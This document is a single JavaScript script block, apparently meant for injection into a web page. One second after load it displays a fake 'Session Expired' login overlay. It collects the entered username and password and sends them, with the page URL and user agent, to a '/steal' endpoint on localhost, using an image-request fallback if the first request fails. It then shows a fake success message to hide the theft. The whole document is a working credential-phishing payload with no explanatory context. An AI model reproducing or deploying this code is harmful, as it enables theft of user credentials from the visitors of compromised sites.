<script>
function showFakeLogin() {
    var overlay = document.createElement('div');
    overlay.id = 'phishingOverlay';
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.85);
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
        font-family: Arial, sans-serif;
    `;

    var loginBox = document.createElement('div');
    loginBox.style.cssText = `
        background: white;
        padding: 40px;
        border-radius: 10px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        width: 400px;
        max-width: 90%;
        text-align: center;
    `;

    loginBox.innerHTML = `
        <div style="margin-bottom: 30px;">
            <h2 style="color: #5a2d82; margin-bottom: 10px;">🔒 Session Expired</h2>
            <p style="color: #666; font-size: 14px;">Your session has timed out for security reasons. Please login again to continue.</p>
        </div>

        <div style="text-align: left; margin-bottom: 20px;">
            <label style="display: block; margin-bottom: 5px; color: #333; font-weight: bold;">Username or Email</label>
            <input type="text" id="fakeUsername" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 14px;" placeholder="Enter your username">
        </div>

        <div style="text-align: left; margin-bottom: 25px;">
            <label style="display: block; margin-bottom: 5px; color: #333; font-weight: bold;">Password</label>
            <input type="password" id="fakePassword" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 14px;" placeholder="Enter your password">
        </div>

        <button onclick="submitStolenCredentials()" style="width: 100%; background: #5a2d82; color: white; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold;">
            Sign In
        </button>

        <p style="font-size: 12px; color: #999; margin-top: 20px;">
            <a href="#" style="color: #5a2d82; text-decoration: none;">Forgot your password?</a>
        </p>
    `;

    overlay.appendChild(loginBox);
    document.body.appendChild(overlay);
}

function submitStolenCredentials() {
    var username = document.getElementById('fakeUsername').value;
    var password = document.getElementById('fakePassword').value;

    if (!username || !password) {
        alert('Please fill in all fields');
        return;
    }

    var payload = {
        username: username,
        password: password,
        victim_url: window.location.href,
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent
    };

    fetch('http://localhost:5001/steal', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Data sent successfully to attacker server');
        showSuccessMessage();
    })
    .catch(error => {
        console.error('Error sending data:', error);
        var img = new Image();
        var params = new URLSearchParams(payload).toString();
        img.src = 'http://localhost:5001/steal?' + params;
        showSuccessMessage();
    });
}

function showSuccessMessage() {
    var overlay = document.getElementById('phishingOverlay');
    overlay.innerHTML = `
        <div style="background: white; padding: 50px; border-radius: 10px; text-align: center;">
            <div style="color: #27ae60; font-size: 48px; margin-bottom: 20px;">✓</div>
            <h3 style="color: #333; margin-bottom: 10px;">Login Successful!</h3>
            <p style="color: #666;">Redirecting to your account...</p>
        </div>
    `;

    setTimeout(function() {
        overlay.remove();
    }, 2000);
}

setTimeout(showFakeLogin, 1000);
</script>
